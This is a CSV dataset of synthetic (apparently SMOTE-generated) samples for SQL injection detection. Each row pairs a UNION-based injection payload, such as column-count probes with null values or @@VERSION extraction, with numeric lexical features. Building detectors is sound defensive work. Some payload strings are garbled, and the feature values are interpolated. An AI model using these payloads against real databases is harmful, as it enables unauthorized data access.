id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000765,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R000119,1.384227544423736,64.45166415579392,20.809393482871624,3.7192240511651375,14.000000000000002,27.237573931486494,14.0,9.214090224307435,0.21870345113119363,0.42051983477702704,0.21870345113119366,0.1420732629605856,0.4046967414358116,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,4.809393482871623,1.0,0.4046967414358116,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000766,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000008,1.0137866421534667,76.08457553887341,31.76616978445064,4.262012859120747,42.0,3.616915107774682,20.084575538873406,10.38308489222532,0.5525900645183205,0.047379886942559096,0.263213247308906,0.1368168012302144,0.0,0.0,2.0,0.0,1.0,1.6169151077746813,0.0,0.0,0.0,0.0,1.0000000000000004,5.38308489222532,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000767,attack,union,"-8419  )   where 8692  =  8692 union all select 8692,8692,8692--",nearest_attack_euclidean,R000102,0.3438877631802463,66.22683574297632,23.876286903167983,3.9638082026985524,19.742278580992107,24.989704774656143,14.247426193664035,7.247426193664036,0.29786508194873185,0.3768858703785368,0.21582690091326787,0.10942214675946343,0.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.247426193664036,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000768,attack,union,"1 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000152,1.0331537168874416,68.35232012451793,14.411919968870514,2.953448690649898,52.35232012451794,1.0,4.0,11.0,0.7657223207775513,0.014642354951403064,0.05856941980561217,0.16106590446543348,0.41191996887051574,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.588080031129484,2.0,0.41191996887051574,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000769,attack,union,"-8419  )   where 8692  =  8692 union all select 8692,8692,8692--",nearest_attack_euclidean,R000102,0.2712624422520865,64.41256780440766,24.0,3.9880056825587533,19.0,24.55009040587687,13.724954797061566,7.137522601469218,0.29512527047237824,0.3806482497032,0.2135315084263913,0.11069497139803045,0.06876130073460862,0.0,3.0,0.0,0.0,1.0,0.0,0.9312386992653912,0.0,0.0,2.1375226014692172,4.0,0.06876130073460873,0.0,1.0,0.0,0.0,1.0,0.9312386992653914,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000770,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000137,1.4624311366581155,73.64021108098135,16.512746461907394,3.18575667148433,42.10197169525916,1.0,18.0,12.538239385722186,0.570849972859332,0.013655954750375732,0.24580718550676392,0.16968688688352826,0.0,1.0,2.0,0.0,0.0,0.0,0.0,3.0,0.5127464619073951,0.0,6.02549292381479,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000771,attack,union,-6947'   )    )    as qqjp where 6700  =  6700 union all select 6700#,nearest_attack_euclidean,R000139,1.5232345321654546,68.59162922166378,26.183258443327574,3.886648713399896,22.54977532998272,20.900449340034566,18.73303377331029,6.408370778336213,0.32846201347553555,0.3053420581661902,0.27271174072502274,0.0934841876332515,0.5916292216637863,0.0,1.0,0.0,0.0,1.0,0.0,1.5916292216637864,0.0,0.0,1.225112335008641,2.0,0.5916292216637863,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000772,attack,union,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",nearest_attack_euclidean,R000113,0.4007888163370614,76.0,21.75336360854141,3.74291864030731,14.000000000000002,35.01345443416564,14.986545565834357,12.0,0.18421052631578946,0.46070334781796896,0.19719138902413627,0.15789473684210525,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.246636391458589,0.0,0.0,6.753363608541411,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000773,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000096,0.38968017862046433,64.11463549587039,23.377072900825922,3.880108729603288,33.4917083966963,9.0,14.0,7.622927099174076,0.5219673402450304,0.1405783111120632,0.21867737284098726,0.11877697580191902,0.0,1.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.6229270991740763,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000774,attack,union,"1%' union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000057,0.8290449614103212,58.71251315229878,16.0,3.149738485984144,44.03438486422408,1.0,4.0,9.678128288074694,0.75,0.017184396539608432,0.06873758615843374,0.1640780173019578,1.0,0.0,0.3390641440373472,0.0,0.0,0.0,0.0,0.0,1.0,0.0,6.508596216056021,0.3390641440373474,1.0,0.0,0.16953207201867365,0.8304679279813264,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000775,attack,union,"1""  )   where 5870  =  5870 union all select null,null,null--",nearest_attack_euclidean,R000111,0.36564741091335234,62.76908831237833,23.646182337524333,3.90593296362847,32.415270649902666,9.0,14.0,7.353817662475667,0.5160183238848322,0.1435862407323882,0.22335637447260392,0.11703906091017569,0.0,1.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.3538176624756666,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000776,attack,union," select * from users where id  =  1 union select @&&@,version  (    )   -- 1",nearest_attack_euclidean,R000028,0.4376869231236549,76.17411147333742,26.0,3.902817083134215,40.0,2.5223344200122675,23.0,10.651777053325155,0.5251256905445152,0.03303984842348898,0.30194727206309624,0.13988718896889957,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,5.8258885266625775,0.0,0.0,1.0,0.17411147333742227,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000777,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000098,0.3224170093298576,66.62444441790782,15.104074069651304,3.0229969904998804,50.416296278605216,1.0,4.0,11.208148139302608,0.7567873176541569,0.015020108497915019,0.060080433991660076,0.1681121398562681,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.10407406965130359,0.0,8.104074069651304,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000778,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000045,0.052679089063630495,73.10737865326166,25.0,4.011827185497005,41.0715857688411,9.0,15.017896442210276,8.017896442210276,0.5617865851121333,0.12312009573793045,0.2054266968063855,0.1096666223435507,1.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.0357928844205517,3.982103557789724,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.9821035577897241,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.982103557789724
SMOTE_000779,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000031,0.932427070067756,74.69909546513651,16.0,3.1179331150403238,50.0,1.0,11.170653255831299,12.528442209305217,0.6708279571583919,0.013416559143167861,0.1479818738611286,0.16777360983731168,1.0,0.0,2.0,0.0,0.0,0.0,0.0,1.5284422093052163,0.0,0.0,8.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000780,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000038,0.025731562900416845,68.97376537384048,21.00655865653988,3.6842875316343697,39.0,9.0,13.973765373840484,7.0,0.5654455184883436,0.1304874273434639,0.20257683290105388,0.10149022126713861,0.0,0.006558656539878915,0.0,0.0,0.0,1.0,0.0,0.9934413434601208,0.0,0.0,4.0,1.0,0.0,0.006558656539879026,0.0,1.0,0.0,1.0,0.9934413434601211,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000781,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,1.3508774803670869,66.17869853093359,21.0,3.7915439183380295,14.000000000000002,30.428401958755217,10.357397061867175,11.392899510311196,0.2116511811237398,0.4606623923821752,0.1556111359216963,0.17207529057238877,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.3928995103111959,0.39289951031119574,0.0,5.607100489688804,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000782,attack,union,"-9163"" union all select 3820,3820,3820,3820,3820,3820,3820,3820,3820#",nearest_attack_euclidean,R000140,1.072303854665363,70.97149576604086,21.663499529560095,3.7036289082377607,14.000000000000002,41.30799623648076,4.0,11.663499529560095,0.1980039624273239,0.5808827251130517,0.05657256069352112,0.16454075176610328,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.33650047043990416,0.0,8.326999059120192,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000783,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000055,0.3164332470137934,62.6615339525743,22.0,3.785415282517809,14.000000000000002,30.92922716205944,8.0,9.73230679051486,0.2237125330148199,0.4931942404368185,0.12783573315132563,0.15525749339703604,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,5.73230679051486,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000784,attack,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",nearest_attack_euclidean,R000147,0.4263274593640875,70.68593050162922,19.171482625407304,3.6503690827322766,14.000000000000002,40.68593050162921,4.0,12.0,0.19814613377938048,0.5754011419013275,0.056613181079822994,0.169839543239469,0.8285173745926973,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.171482625407302,3.0,0.8285173745926973,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000785,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,0.4012060178377177,62.14496141807527,14.0,2.983755368615336,47.71596913446021,1.0,4.0,9.428992283615054,0.7676880768657501,0.016155961567124927,0.06462384626849975,0.15153211529862518,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.428992283615054,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000786,attack,union,"-3790""  )   as ojgb where 5925  =  5925 union all select 5925,5925#",nearest_attack_euclidean,R000066,1.1006064551233128,67.32034177243536,27.718632910258595,4.059469895258966,23.077949365387894,22.56273417948281,15.359316455129298,6.320341772435351,0.34311107620063763,0.3347884887130468,0.22825916025783521,0.09384127482848034,0.0,0.6796582275646488,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.6406835448707024,2.0,0.0,0.6796582275646488,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000787,attack,union," select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000014,0.3518246230964985,81.3795770447605,33.0,4.300662989440794,42.0,3.9310641160845012,21.6553205804225,13.7931923482535,0.5165482399131405,0.048250743290993464,0.26585125168892654,0.16934976510693955,2.7931923482535006,0.0,2.0,0.0,1.0,1.9310641160845001,0.0,0.0,0.0,0.0,1.0000000000000004,6.0,0.9310641160845001,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000788,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000110,0.8895672932156524,62.16230900963464,22.0,3.7622493527121383,14.000000000000002,27.099490692359048,11.675381980730712,9.387436336544882,0.2253400803957774,0.4347268227465857,0.1890179238446948,0.1509151730129421,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.6125636634551188,0.0,0.0,4.774872673089763,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000789,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000084,0.7199764276822632,69.68761200427494,15.737522400854989,3.089991829965565,50.0,1.0,6.950089603419953,11.737522400854989,0.7182286384520385,0.014364572769040795,0.09900884887081034,0.1683979399081103,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.7375224008549885,0.0,0.0,8.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.7375224008549885,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000790,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000095,0.3330075189613518,56.6089272566646,18.67821454866708,3.618614334475155,14.000000000000002,29.28714180533168,4.0,9.32178545133292,0.2477197025474835,0.5168917685171617,0.07077705787070958,0.16461147106464522,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.32178545133292,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000791,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000136,0.5996836178163779,67.74358171032267,16.0,3.153041341436296,42.0,1.0,14.594865368258132,10.148716342064533,0.6203917015270415,0.014771230988739115,0.21505925284593233,0.1497778146382871,0.1487163420645331,0.8512836579354669,0.0,0.0,0.0,0.0,0.0,2.148716342064533,0.0,0.0,6.0,0.0,0.1487163420645331,0.8512836579354668,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000792,attack,union,"-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--",nearest_attack_euclidean,R000080,0.0015782038593428222,70.00467108058915,23.999610743284236,4.048002734770755,19.002335540294574,32.0,10.002335540294574,9.0,0.27144159186226935,0.4571168162754612,0.14287748728479593,0.12856410457747344,0.9996107432842375,0.0,3.0,0.0,0.0,1.0,0.0,0.00038925671576262033,0.0,0.0,4.0,4.0,0.9996107432842374,0.0,1.0,0.0,0.0,1.0,0.0003892567157623983,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000793,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000142,0.692254794288531,69.0521591151659,20.6314335738972,3.786112015586796,14.789291967371506,29.262867147794402,14.0,11.0,0.21346125638088956,0.4229760529249216,0.20359510678874576,0.1599675839054431,0.0,1.0,3.0,0.0,0.0,0.1578583934743007,0.0,1.8421416065256992,0.0,0.0,5.0,3.1578583934743008,0.0,1.0,1.0,0.0,0.0,0.1578583934743007,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.15785839347430064,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1578583934743008
SMOTE_000794,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000118,1.5146267822519521,62.54286834861547,20.54286834861547,3.7423492865827708,14.000000000000002,22.171473394461888,15.82852660553811,10.542868348615473,0.22386068692252517,0.3542688129760183,0.2533530515279786,0.16851744857347786,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.457131651384528,0.5428683486154723,0.0,3.5428683486154724,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000795,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,1.2247391521910274,58.73243498097146,14.633782509514267,3.0902939375942924,43.46486996194293,1.0,5.267565019028536,9.0,0.7387500561285383,0.017043918160425164,0.0908107622672102,0.15339526344382642,0.316891254757134,0.0,2.0,0.0,0.0,0.0,0.0,0.316891254757134,0.0,0.0,6.366217490485732,2.0,0.3168912547571339,0.0,1.0,0.0,0.0,0.0,0.316891254757134,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000796,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,1.6244291143856497,74.21870211193232,29.56259577613536,4.155996399053681,42.3750638507569,1.9999999999999982,19.84363826117541,10.0,0.571693721734,0.026957930024537752,0.26655869811877353,0.13478965012268868,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.8124680746215459,0.0,0.0,1.0000000000000004,4.593765962689227,0.0,0.0,1.0,0.0,0.0,1.0,0.406234037310773,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000797,attack,union,"-6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#",nearest_attack_euclidean,R000099,0.5436991138361909,74.0,20.20342885183031,3.4113743095162947,14.000000000000002,43.18628459267876,4.813715407321235,12.0,0.18918918918918917,0.583598440441605,0.06505020820704374,0.16216216216216217,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.203428851830309,0.0,0.0,8.79657114816969,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.2034288518303089,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
